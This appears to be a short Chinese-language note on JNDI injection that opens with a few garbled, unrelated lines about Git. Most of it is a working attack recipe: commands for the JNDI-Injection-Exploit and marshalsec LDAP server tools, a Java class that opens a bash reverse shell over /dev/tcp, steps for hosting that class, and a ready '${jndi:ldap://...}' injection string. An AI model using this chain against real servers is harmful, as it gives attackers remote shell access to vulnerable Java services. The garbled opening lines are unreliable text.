Git is a version control sysrem.
Git is free software.
wher true
will be not
branch modify





JNDI注入工具：

JNDI-Injection-Exploit

```
java -jar JNDI-Injection-Exploit -C "command" -A 127.0.0.1
```



marshalsec-jar

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefserver "http://ip/#EXp" 1389
```

需要准备包含恶意代码的exp.java文件

```java
import java.lang.Runtime;
import java.lang.Process;

public class Exp {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"bash", "-c", "bash -i >& /dev/tcp/ip/9999 0>&1"};
            //linux
            Process pc = rt.exec(commands);
            //Process pc = rt.exec(command: "calc"); windows
            pc.waitFor();
        } catch (Exception e) {
            //do nothing
        }
    }
}
```

将以上代码使用`javac` exp.java编译生成exp.class

将生成的类放到搭建的web根目录中 例如`httpS://127.0.0.1/exp.class`

使用工具marshalsec-jar

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefserver "http://127.0.0.1/#eXp" 1389
```

注：无.class，有.class将会报错 #为标识元素名

则会服务器会开启1389端口服务，且加载了exp的类

去注入点：`${jndi:ldap://127.0.0.1:1389/exp}`即可利用
